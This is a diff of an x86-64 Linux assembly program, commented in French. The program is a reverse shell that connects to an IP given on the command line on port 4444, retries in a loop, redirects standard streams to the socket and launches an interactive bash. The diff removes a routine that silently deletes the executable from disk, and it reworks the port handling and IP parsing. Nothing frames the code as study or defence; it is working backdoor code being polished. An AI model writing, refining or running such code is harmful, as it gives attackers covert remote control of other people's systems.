@@ -13,41 +13,16 @@ section .data
     err_connect  db 'Error: Connection failed',10,0
     timespec     dq 5, 0          ; 5 secondes entre les tentatives
     
-    ; Chemins système
-    self_path    db '/proc/self/exe',0
-    port_str     db '4444',0       ; Port fixe
+    ; Port fixe
+    port_num     dw 4444
 
 section .bss
     ip_bytes     resd 1           ; IP en format réseau
     port_bytes   resw 1           ; Port en format réseau
-    self_exe     resb 256         ; Buffer pour le chemin de l'exécutable
+    sockaddr     resb 16          ; Structure sockaddr_in
 
 section .text
     global _start
-
-;----------------------------------------------------------
-; Auto-suppression silencieuse
-;----------------------------------------------------------
-self_destruct:
-    mov rax, 89                   ; sys_readlink
-    mov rdi, self_path
-    mov rsi, self_exe
-    mov rdx, 256
-    syscall
-    
-    test rax, rax
-    js .finish                    ; Ignorer si erreur
-    
-    mov rdi, self_exe             ; Ajouter NULL terminal
-    add rdi, rax
-    mov byte [rdi], 0
-    
-    mov rax, 87                   ; sys_unlink
-    mov rdi, self_exe
-    syscall
-
-.finish:
-    ret
 
 ;----------------------------------------------------------
 ; Validation et conversion de l'IP
@@ -59,11 +34,12 @@ validate_and_parse_ip:
     mov rbp, rsp
     push rbx
     push r12
+    push r13
     
     mov rsi, rdi
     xor rbx, rbx                  ; Compteur d'octets
     xor r12d, r12d                ; IP accumulée
-    xor eax, eax                  ; Valeur d'octet courante
+    xor r13d, r13d                ; Valeur d'octet courante
 
 .parse_loop:
     movzx edx, byte [rsi]
@@ -79,9 +55,9 @@ validate_and_parse_ip:
     ja .invalid
     
     sub dl, '0'
-    imul eax, 10
-    add eax, edx
-    cmp eax, 255
+    imul r13d, r13d, 10
+    add r13d, edx
+    cmp r13d, 255
     ja .invalid
     
     inc rsi
@@ -92,80 +68,38 @@ validate_and_parse_ip:
     jae .invalid
     
     shl r12d, 8
-    or r12d, eax
+    or r12d, r13d
     inc bl
-    xor eax, eax
+    xor r13d, r13d
     inc rsi
     jmp .parse_loop
 
 .end_parse:
-    cmp bl, 3                     ; Doit avoir 4 octets
+    cmp bl, 3                     ; Doit avoir exactement 3 points (4 octets)
     jne .invalid
     
     shl r12d, 8
-    or r12d, eax
-    bswap r12d                    ; Convertir en big-endian
-    mov [ip_bytes], r12d
+    or r12d, r13d
+    ; Convertir en format réseau (big-endian)
+    mov eax, r12d
+    bswap eax
+    mov [ip_bytes], eax
     mov rax, 1
     jmp .done
 
 .invalid:
     xor rax, rax
 .done:
+    pop r13
     pop r12
     pop rbx
     pop rbp
     ret
 
 ;----------------------------------------------------------
-; Validation et conversion du port (fixé à 4444)
-;----------------------------------------------------------
-validate_port:
-    mov rsi, port_str
-    xor rax, rax
-    xor rcx, rcx                  ; Compteur de chiffres
-
-.convert_loop:
-    movzx edx, byte [rsi]
-    test dl, dl
-    jz .check_value
-    
-    cmp dl, '0'
-    jb .invalid
-    cmp dl, '9'
-    ja .invalid
-    
-    sub dl, '0'
-    imul rax, 10
-    add rax, rdx
-    cmp rax, 65535
-    ja .invalid
-    inc rsi
-    inc rcx
-    jmp .convert_loop
-
-.check_value:
-    test rcx, rcx                 ; Vérifier au moins 1 chiffre
-    jz .invalid
-    
-    cmp rax, 4444                 ; Port doit être 4444
-    jne .invalid
-    
-    xchg al, ah                   ; Convertir en big-endian
-    mov [port_bytes], ax
-    mov rax, 1
-    ret
-
-.invalid:
-    xor rax, rax
-    ret
-
-;----------------------------------------------------------
 ; Programme principal
 ;----------------------------------------------------------
 _start:
-    call self_destruct            ; Auto-suppression
-    
     pop rcx                       ; argc
     cmp rcx, 2
     jne usage_error
@@ -176,10 +110,11 @@ _start:
     call validate_and_parse_ip
     test rax, rax
     jz ip_error
-    
-    call validate_port
-    test rax, rax
-    jz port_error
+
+    ; Convertir le port en format réseau
+    mov ax, [port_num]
+    xchg al, ah                   ; Conversion en big-endian
+    mov [port_bytes], ax
 
 connection_loop:
     ; Création du socket
@@ -194,40 +129,40 @@ connection_loop:
     mov r8, rax                   ; Sauvegarder le socket fd
 
     ; Configuration de la structure sockaddr_in
-    sub rsp, 16
-    mov word [rsp], 2             ; AF_INET
+    lea rdi, [sockaddr]
+    mov word [rdi], 2             ; AF_INET
     mov ax, [port_bytes]
-    mov word [rsp+2], ax          ; Port
+    mov word [rdi+2], ax          ; Port en big-endian
     mov eax, [ip_bytes]
-    mov dword [rsp+4], eax        ; IP
-    mov qword [rsp+8], 0          ; Padding
+    mov dword [rdi+4], eax        ; IP en big-endian
+    mov qword [rdi+8], 0          ; Padding
 
     ; Connexion
     mov rax, 42                   ; sys_connect
     mov rdi, r8                   ; socket fd
-    mov rsi, rsp                  ; sockaddr_in
+    lea rsi, [sockaddr]           ; sockaddr_in
     mov rdx, 16                   ; addrlen
     syscall
-    add rsp, 16
     
     test rax, rax
     js connect_error
 
-    ; Redirection des flux standard
-    xor rsi, rsi                  ; Descripteur cible
+    ; Redirection des flux standard (stdin, stdout, stderr)
+    xor rsi, rsi
 .dup_loop:
     mov rax, 33                   ; sys_dup2
-    mov rdi, r8                   ; Source (socket)
+    mov rdi, r8                   ; socket fd
+    ; rsi contient déjà 0, 1, ou 2
     syscall
     inc rsi
-    cmp rsi, 3                    ; 0=stdin, 1=stdout, 2=stderr
+    cmp rsi, 3
     jne .dup_loop
 
-    ; Exécution du shell interactif
+    ; Exécution du shell
     mov rax, 59                   ; sys_execve
-    lea rdi, [command]            ; /bin/bash
-    lea rsi, [bash_args]          ; ["/bin/bash", "-i"]
-    lea rdx, [env_vars]           ; ["TERM=xterm"]
+    lea rdi, [command]
+    lea rsi, [bash_args]
+    lea rdx, [env_vars]
     syscall
 
     ; En cas d'échec d'execve
@@ -237,45 +172,43 @@ connection_loop:
 ; Gestion des erreurs
 ;----------------------------------------------------------
 usage_error:
-    mov rax, 1
-    mov rdi, 2
+    mov rax, 1                    ; sys_write
+    mov rdi, 2                    ; stderr
     lea rsi, [err_usage]
     mov rdx, 30
     syscall
     jmp exit_program
 
 ip_error:
-    mov rax, 1
-    mov rdi, 2
+    mov rax, 1                    ; sys_write
+    mov rdi, 2                    ; stderr
     lea rsi, [err_ip_format]
     mov rdx, 25
     syscall
     jmp exit_program
 
-port_error:
-    mov rdi, 1
-    jmp exit_program
-
 socket_error:
-    mov rax, 1
-    mov rdi, 2
+    mov rax, 1                    ; sys_write
+    mov rdi, 2                    ; stderr
     lea rsi, [err_socket]
     mov rdx, 28
     syscall
     jmp exit_program
+
 connect_error:
+    ; Fermer le socket avant de réessayer
     mov rax, 3                    ; sys_close
     mov rdi, r8
     syscall
-    
+
+    ; Attendre avant de réessayer
     mov rax, 35                   ; sys_nanosleep
     lea rdi, [timespec]
     xor rsi, rsi
     syscall
-    jmp connection_loop           ; Réessayer
+    jmp connection_loop
 
 exit_program:
     mov rax, 60                   ; sys_exit
-    mov rdi, 1
+    mov rdi, 1                    ; code de sortie
     syscall
-
